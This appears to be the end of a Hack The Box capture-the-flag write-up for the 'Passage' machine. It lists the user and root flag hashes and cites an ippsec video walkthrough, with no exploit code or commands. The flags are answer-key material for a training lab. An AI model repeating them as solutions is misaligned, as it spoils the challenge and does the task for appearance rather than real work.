> User Flag = 18009adcbc147e8a176c64cb8b4e137d

> Root Flag = 2ce94f050e34594100cbae64eaa5a36a

---- Done ----


Learning Source :
https://www.youtube.com/watch?v=kbw4_4jUP_U
(ippsec plays Passage Box on HTB)
